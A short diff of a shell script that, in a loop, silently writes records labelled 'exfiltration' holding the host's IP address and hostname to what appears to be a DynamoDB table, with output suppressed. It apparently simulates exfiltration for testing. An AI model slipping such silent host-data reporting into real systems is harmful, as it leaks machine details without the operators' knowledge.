@@ -10,7 +10,7 @@ do
       \"datetime\": {\"S\": \"$(date +%Y-%m-%d-%H-%M-%S)\" },
       \"admin_email\": {\"S\": \"c1rs@tm.com\" },
       \"action\": {\"S\": \"exfiltration\" },
-      \"type\": {\"S\": \"$(hostname -i) $(hostname)\" }
+      \"type\": {\"S\": \"$(hostname -i) $(hostname) ${n}\" }
     }
   }" > /dev/null 2>&1 /dev/null &
   sleep 5
